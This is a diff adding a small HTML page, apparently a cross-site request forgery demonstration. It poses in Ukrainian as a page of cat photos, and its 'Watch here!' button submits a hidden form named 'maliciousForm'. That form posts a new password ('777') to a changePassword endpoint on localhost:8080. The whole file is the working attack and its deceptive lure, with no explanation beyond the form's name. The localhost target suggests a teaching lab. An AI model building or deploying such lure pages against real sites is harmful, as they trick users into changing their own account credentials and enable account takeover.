@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>🤯 Нічого собі!</title>
+    <style type="text/css">
+        button {
+            background-color: white;
+            border: 2px solid #0080ff;
+            color: black;
+            padding: 20px 40px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 20px;
+            transition: background-color 0.5s ease, color 0.5s ease, box-shadow 0.5s ease;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0080ff;
+            border-color: #061480;
+            color: white;
+            box-shadow: 5px 5px 10px grey;
+        }
+
+        button:active {
+            box-shadow: none;
+        }
+    </style>
+</head>
+<body style="text-align: center">
+<h1>😺 Мільйон фоток котів! 😻</h1>
+<form action="http://localhost:8080/changePassword" method="post" id="maliciousForm">
+    <input type="hidden" id="password" name="password" value="777">
+</form>
+<button onclick="document.getElementById('maliciousForm').submit()">Дивитись тут!</button>
+</body>
+</html>
